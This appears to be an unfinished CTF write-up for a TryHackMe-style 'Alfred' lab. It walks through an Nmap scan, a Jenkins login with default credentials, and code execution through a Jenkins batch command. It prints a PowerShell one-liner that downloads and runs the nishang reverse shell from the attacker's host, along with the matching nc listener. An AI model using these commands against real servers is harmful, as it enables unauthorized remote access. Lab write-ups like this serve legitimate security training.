# Alfred

IP Address: 10.10.60.65

## Description

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

## Flags

1. 
2. 
3.

## Enumeration/Scanning

### Nmap:
```sh
sudo  nmap -Pn  -p1-10000 -vv -sC -oN alfred.nmap 10.10.253.237
# Nmap 7.92 scan initiated Wed Sep 28 21:16:47 2022 as: nmap -Pn -p1-10000 -vv -sC -oN alfred.nmap 10.10.253.237
Nmap scan report for 10.10.253.237
Host is up, received user-set (0.17s latency).
Scanned at 2022-09-28 21:16:59 PDT for 31s

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server syn-ack ttl 127
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-09-28T03:44:49
| Not valid after:  2023-03-30T03:44:49
| MD5:   f15a ae7e e244 e120 c763 a386 2219 e260
| SHA-1: 0bb8 058f dc67 c558 0564 b9f7 d48b 0289 98ef ca94
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQIhDB6uMfHLBKikg4+ZpHMzANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZhbGZyZWQwHhcNMjIwOTI4MDM0NDQ5WhcNMjMwMzMwMDM0NDQ5
| WjARMQ8wDQYDVQQDEwZhbGZyZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQC2TBp0E9a2bzlmG1Pw7fnOg3fuuSPa7Onj045hnmlWkK1ODN+iiG5/1cHZ
| Tn5mJkZI3fKj5Ng9IuA4xR5JHOb8SZ2aBGtRCnJnzI2MO61dZHXtkWvwyMjx6/5A
| vQM+A7BZMmxk/Gd1aQvJPbU/gp19ZBEhjESvNn0U8LR+4JHBUB6K/8XX1IfFFKZ6
| xlussnH1Zt6pu5gfQEuygI6nI0IHb8Uy2f99G5N0/4xqLh9u2cPPh6PJD9j2wElB
| WUMdLM6hDqPwclInQqf6LmFFgzrEIqaAGGs/QYZ45y4WlpJzpWK19FDV5MilCCkY
| R/RTQhQk6Xp47jnq0Je23oKP64QNAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAX6vTZ3ux/N5qnJ2W
| gxiSjU4sLdqPGcU2Z70Got2eYSJPCNcmyVC+CHe/VkKTXjYTzVSQiMJ/oiYGB3ZF
| CjjgnuryaZ6LhgMTwhJU8oy5NAstg7akI/mA80JDYhn7JLEd47AL28qC+kmJDyx+
| 5jDDiB63H6IH3eejc0KjiKFUXNhcRrSdc9jZXXl7cFJuEDWlCqIWARjOmRxvf7ae
| ImnHil0vqjK6szH19XEpOyMReQM6DmkWezLzkAVPgmJQX1h4rTVXRDOwF03+aFXv
| 5SOJhpflFfXkBY1OtwkrWU++0HrQy+rW6nvzfG9vIEXKWJXEyUzMzPqVSrj0FGGE
| ATB0Sw==
|_-----END CERTIFICATE-----
8080/tcp open  http-proxy    syn-ack ttl 127
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Sep 28 21:17:30 2022 -- 1 IP address (1 host up) scanned in 43.14 seconds
```
### Web Server

#### Port 8080

![Welcome to Jenkins](img/jenkins.png)

**We noice that Using the default credentials (admin:admin), we can gain access to the web server.**

## Exploitation

Searching through this platform, we find [Jenkins](https://www.jenkins.io/doc/book/managing/cli/), giving us valuable information on using a CLI client (with our credentials) to execute commands on the machine.

```sh
java -jar jenkins-cli.jar -s http://10.10.253.237:8080/ -auth admin:admin who-am-i
Authenticated as: admin
Authorities:
  authenticated
```

However, this leads to a dead end. Continuing our search by clicking on project, then configure, we find a window allowing us to execute windows batch commands.

We can now upload a reverse shell payload. We will be using the `Invoke-PowershellTcp.ps1` shell from the [nishang](https://github.com/samratashok/nishang) repo. After starting a python server, we can upload our payload, start a `nc` listener, then execute!

```sh
sudo python3 -m http.server 80
```

```sh
sudo nc -nvlp 4444
```

```
powershell iex (New-Object Net.WebClient).DownloadString(‘http://LOCAL_IP:80/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress LOCAL_IP -Port 4444
```


#### Privilege Escalation


